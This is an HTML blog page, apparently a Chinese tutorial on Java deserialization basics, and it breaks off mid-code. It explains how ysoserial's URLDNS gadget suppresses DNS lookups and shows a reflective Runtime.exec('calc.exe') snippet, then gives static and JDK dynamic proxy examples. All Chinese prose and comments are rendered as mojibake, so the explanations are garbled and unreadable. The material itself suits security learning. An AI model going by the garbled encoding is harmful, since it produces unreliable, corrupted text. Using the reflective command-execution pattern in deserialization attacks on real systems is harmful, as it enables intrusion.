<p>ysoserial ä¸ºäº†é¿å…ç¬¬ä¸€æ¬¡åºåˆ—åŒ–æ—¶å°±å‘èµ· DNS è¯·æ±‚ï¼Œå®ƒä½¿ç”¨äº† SilentURLStreamHandler() å†…éƒ¨ç±»è‡ªå®šä¹‰äº† handler ï¼Œè¦†ç›–åŸæ¥çš„ URL.hashCode.<font style="color:#080808;background-color:#ffffff;">handlerï¼Œå½“ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶ï¼Œè¿›å…¥ SilentURLStreamHandler.getHostAddress  å’Œ  SilentURLStreamHandler.openConnection  ï¼Œéƒ½è¿”å› null ï¼Œé¿å… DNS è¯·æ±‚å’Œè®¿é—®ç½‘ç»œã€‚è¿™æ ·åœ¨åˆ›å»º payload çš„é˜¶æ®µå°±ä¸ä¼šè§¦å‘ DNS ï¼Œè€Œååºåˆ—åŒ–æ—¶ï¼ŒhashCode &#x3D;&#x3D; -1ï¼Œè§¦å‘åŸæœ¬çš„ getHostAddress è§¦å‘ DNS è¯·æ±‚ã€‚</font></p>
<h2 id="2-4-åˆ©ç”¨-Runtime"><a href="#2-4-åˆ©ç”¨-Runtime" class="headerlink" title="2.4 åˆ©ç”¨ Runtime"></a>2.4 åˆ©ç”¨ Runtime</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.demo01;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Runtime</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;<br>        <span class="hljs-comment">// 1. è·å– Runtime ç±»</span><br>        Class&lt;?&gt; runtimeClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 2. è·å– getRuntime() æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><br>        <span class="hljs-comment">// 3. è°ƒç”¨ getRuntime() è·å– Runtime å¯¹è±¡</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">runtimeInstance</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// 4. è·å– exec(String) æ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><br>        <span class="hljs-comment">// 5. è°ƒç”¨ exec() æ‰§è¡Œ calc.exe</span><br>        execMethod.invoke(runtimeInstance, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757810.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="3ã€JDK-åŠ¨æ€ä»£ç†"><a href="#3ã€JDK-åŠ¨æ€ä»£ç†" class="headerlink" title="3ã€JDK åŠ¨æ€ä»£ç†"></a>3ã€JDK åŠ¨æ€ä»£ç†</h1><p>å‚è€ƒæ–‡ç« ï¼š</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/taohuayuanpang/kfw7zl/rpagg11nwkzm2qh2#nIfNv">ä»£ç†æ¨¡å¼(ç‹‚ç¥)</a></p>
<p><font style="color:rgb(25, 27, 31);">è®¾è®¡æ¨¡å¼ï¼ˆå››ï¼‰â€”â€”ææ‡‚ä»€ä¹ˆæ˜¯ä»£ç†æ¨¡å¼</font><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/72644638">https://zhuanlan.zhihu.com/p/72644638</a></p>
</blockquote>
<p><strong>ä»£ç†æ¨¡å¼å³ SpringAOP çš„åº•å±‚</strong></p>
<p><strong>ä»£ç†æ¨¡å¼åˆ†ä¸ºé™æ€ä»£ç†å’ŒåŠ¨æ€ä»£ç†</strong></p>
<p>åŸå‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757644.png" srcset="/img/loading.gif" lazyload> </p>
<h2 id="3-1-é™æ€ä»£ç†"><a href="#3-1-é™æ€ä»£ç†" class="headerlink" title="3.1 é™æ€ä»£ç†"></a>3.1 <strong>é™æ€ä»£ç†</strong></h2><p>è§’è‰²åˆ†æï¼š</p>
<ul>
<li>æŠ½è±¡è§’è‰² ï¼š ä¸€èˆ¬ä¼šä½¿ç”¨æ¥å£æˆ–è€…æŠ½è±¡ç±»æ¥è§£å†³</li>
<li>çœŸå®è§’è‰² ï¼šè¢«ä»£ç†è§’è‰²</li>
<li>ä»£ç†è§’è‰² ï¼šä»£ç†çœŸå®è§’è‰²ï¼Œ</li>
<li>å®¢æˆ· ï¼šè®¿é—®ä»£ç†å¯¹è±¡çš„äºº</li>
</ul>
<p>ä»£ç†æ¨¡å¼çš„å¥½å¤„ï¼š</p>
<ul>
<li>å¯ä»¥ä½¿çœŸå®è§’è‰²çš„æ“ä½œæ›´åŠ çº¯ç²¹ï¼Œä¸ç”¨å…³æ³¨ä¸€äº›å…¬å…±çš„ä¸šåŠ¡</li>
<li>å…¬å…±ä¹Ÿäº¤ç»™ä»£ç†è§’è‰²ï¼Œå®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥</li>
<li>å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•çš„æ—¶å€™ï¼Œæ–¹ä¾¿é›†ä¸­ç®¡ç†</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸€ä¸ªçœŸå®è§’è‰²å°±ä¼šäº§ç”Ÿä¸€ä¸ªä»£ç†è§’è‰²ï¼Œä»£ç é‡ç¿»å€ï¼Œå¼€å‘æ•ˆç‡ä¼šå˜ä½</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//æˆ¿ä¸œè¦ç§Ÿæˆ¿å­</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//ä»£ç†ï¼Œä¸­ä»‹å¸®æˆ¿ä¸œç§Ÿæˆ¿å­ï¼Œä½†æ˜¯ä»£ç†ä¼šæœ‰ä¸€äº›é™„å±æ“ä½œ</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//ä½ ä¸ç”¨é¢å¯¹æˆ¿ä¸œï¼Œç›´æ¥æ‰¾ä¸­ä»‹ç§Ÿæˆ¿å­</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//çœ‹æˆ¿</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦ä½ çœ‹æˆ¿&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//æ”¶ä¸­ä»‹è´¹</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹æ”¶å–ä¸­ä»‹è´¹&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç­¾ç§ŸèµåˆåŒ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹ç­¾ç§ŸèµåˆåŒ&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757637.png" srcset="/img/loading.gif" lazyload></p>
<p>å¦ä¸€ä¾‹:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//çœŸå®å¯¹è±¡</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¿®æ”¹äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//æ—¥å¿—æ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] ä½¿ç”¨äº†&quot;</span>+msg+<span class="hljs-string">&quot;æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//ä»£ç†ç±»</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//ä½¿ç”¨ä»£ç†ç±»å®ç°æ—¥å¿—åŠŸèƒ½ï¼</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p><font style="color:rgb(255, 0, 0);">åœ¨ä¸æ”¹å˜åŸæ¥çš„ä»£ç çš„æƒ…å†µä¸‹ï¼Œå®ç°äº†å¯¹åŸæœ‰åŠŸèƒ½çš„å¢å¼ºï¼Œè¿™æ˜¯AOPä¸­æœ€æ ¸å¿ƒçš„æ€æƒ³</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311757323.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="3-2-åŠ¨æ€ä»£ç†"><a href="#3-2-åŠ¨æ€ä»£ç†" class="headerlink" title="3.2 åŠ¨æ€ä»£ç†"></a>3.2 åŠ¨æ€ä»£ç†</h2><ul>
<li>åŠ¨æ€ä»£ç†å’Œé™æ€ä»£ç†è§’è‰²ä¸€æ ·</li>
<li>åŠ¨æ€ä»£ç†çš„ä»£ç†ç±»æ˜¯åŠ¨æ€ç”Ÿæˆçš„ï¼Œä¸æ˜¯æˆ‘ä»¬ç›´æ¥å†™å¥½çš„</li>
<li>åŠ¨æ€ä»£ç†åˆ†ä¸ºä¿©å¤§ç±»ï¼šåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼ŒåŸºäºç±»çš„åŠ¨æ€ä»£ç†<ul>
<li>åŸºäºæ¥å£â€“JDK åŠ¨æ€ä»£ç†</li>
<li>åŸºäºç±»â€“cglib</li>
<li>java å­—èŠ‚ç å®ç°ï¼šjavasist</li>
</ul>
</li>
</ul>
<p><font style="color:#080808;background-color:#ffffff;">äº†è§£ä¿©ä¸ªç±»ï¼š</font></p>
<ul>
<li>Proxyï¼šä»£ç†</li>
<li><font style="color:#080808;background-color:#ffffff;">InvocationHandlerï¼šè°ƒç”¨å¤„ç†ç¨‹åº</font></li>
</ul>
<p><strong><font style="color:rgb(255, 0, 0) !important;background-color:rgb(248, 248, 248) !important;">åŠ¨æ€ä»£ç†çš„å¥½å¤„</font></strong></p>
<p><font style="color:rgba(0, 0, 0, 0.9);">é™æ€ä»£ç†æœ‰çš„å®ƒéƒ½æœ‰ï¼Œé™æ€ä»£ç†æ²¡æœ‰çš„ï¼Œå®ƒä¹Ÿæœ‰ï¼</font></p>
<ul>
<li><font style="color:rgba(0, 0, 0, 0.9);">å¯ä»¥ä½¿å¾—æˆ‘ä»¬çš„çœŸå®è§’è‰²æ›´åŠ çº¯ç²¹ . ä¸å†å»å…³æ³¨ä¸€äº›å…¬å…±çš„äº‹æƒ… .</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">å…¬å…±çš„ä¸šåŠ¡ç”±ä»£ç†æ¥å®Œæˆ . å®ç°äº†ä¸šåŠ¡çš„åˆ†å·¥ ,</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">å…¬å…±ä¸šåŠ¡å‘ç”Ÿæ‰©å±•æ—¶å˜å¾—æ›´åŠ é›†ä¸­å’Œæ–¹ä¾¿ .</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">ä¸€ä¸ªåŠ¨æ€ä»£ç† , ä¸€èˆ¬ä»£ç†æŸä¸€ç±»ä¸šåŠ¡</font></li>
<li><font style="color:rgba(0, 0, 0, 0.9);">ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯ä»¥ä»£ç†å¤šä¸ªç±»ï¼Œä»£ç†çš„æ˜¯æ¥å£ï¼</font></li>
</ul>
<p>æ¡ˆä¾‹ä¸€</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//æˆ¿ä¸œ</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;æˆ¿ä¸œè¦å‡ºç§Ÿæˆ¿å­&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//ç§Ÿæˆ¿</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//ä½¿ç”¨æ­¤ç±»è‡ªåŠ¨ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//è¢«ä»£ç†çš„æ¥å£</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//ç”Ÿæˆå¾—åˆ°ä»£ç†ç±»</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†ä»£ç†å®ä¾‹ï¼Œå¹¶è¿”å›ç»“æœ</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//åŠ¨æ€ä»£ç†çš„æœ¬è´¨ï¼Œå°±æ˜¯ä½¿ç”¨åå°„æœºåˆ¶å®ç°</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;ä¸­ä»‹å¸¦çœ‹æˆ¿å­&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span 